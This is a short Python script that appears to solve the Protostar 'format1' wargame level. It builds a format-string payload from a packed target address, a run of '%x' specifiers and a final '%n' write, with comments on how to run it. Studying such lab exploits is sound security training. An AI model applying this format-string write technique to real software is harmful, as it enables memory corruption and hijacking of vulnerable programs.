#!/usr/bin/python
import struct



#NOTE
#The only case its will work if u used it exactly like this!
#/opt/protostar/bin./format1 $(./exploit.py)
#because the stack will move lower or higher with the env variables.


TARGET = struct.pack("I" , 0x8049638)


exploit = "AAAA" + TARGET + "BBBB"
#Place our target in the stack.
exploit += "%x " * 138
#Hit the target in the stack and make it the next value waiting for process with printf().
exploit += "%n "
#Use %n to print the length of previuse text in the next value in the stack (out target)
print exploit
